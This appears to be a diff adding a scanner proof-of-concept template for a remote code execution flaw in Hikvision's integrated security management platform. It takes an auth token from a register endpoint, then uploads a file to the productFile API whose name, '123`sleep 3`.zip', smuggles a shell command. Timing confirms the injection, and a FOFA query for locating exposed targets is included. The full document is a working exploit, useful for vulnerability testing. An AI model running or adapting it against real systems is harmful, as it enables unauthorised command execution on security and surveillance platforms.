@@ -1,0 +1,37 @@
+id: poc-yaml-hikvision-productfile-rce
+info:
+  name: 海康威视综合安防管理平台productFile远程代码执行
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 海康威视综合安防管理平台
+  fofa: title="综合安防管理平台"
+requests:
+- method: GET
+  path: /iac/iasService/v1/register
+  output:
+  - regex_match(headers, `Token:\s*(?P<token>[\w=]+)`)
+  expression: 'contains(headers,"Token:")
+
+    '
+- method: POST
+  path: /svm/api/v1/productFile?type=product&ip=127.0.0.1&agentNo=1
+  headers:
+    Token: '{{.token}}'
+    Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
+  data: '-----------------------------142851345723692939351758052805
+
+    Content-Disposition: form-data; name="file"; filename="123`sleep 3`.zip"
+
+    Content-Type: application/zip
+
+
+    123
+
+    -----------------------------142851345723692939351758052805--'
+  expression: "status_code == 200 && \ncontains(body,\"\\\"code\\\":\\\"0\\\"\") &&\n\
+    contains(body,\"msg\") &&\ncontains(body,\"data\") &&\nduration >= 6 &&\nduration\
+    \ <= 7\n"
+variables: {}
+transport: http
